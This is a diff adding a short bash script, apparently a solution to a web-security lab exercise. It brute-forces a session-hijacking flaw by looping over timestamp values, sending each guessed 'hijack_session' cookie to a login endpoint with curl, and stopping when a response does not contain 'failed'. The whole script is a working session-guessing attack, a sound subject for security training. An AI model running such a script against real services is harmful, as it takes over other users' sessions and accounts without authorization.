@@ -1,0 +1,10 @@
+#!/bin/bash
+for ts in {17686674347..17686674359}; do
+  result=$(curl -s -X POST -b "hijack_session=ea808bca-61c8-40cb-acb-5825782-$ts" \                                                
+    http://web0x01.hbtn/api/a1/hijack_session/login)
+                                        
+  if [[ "$result" != *"failed"* ]]; then
+    echo "TAPDIM: $result"
+    break
+  fi
+done
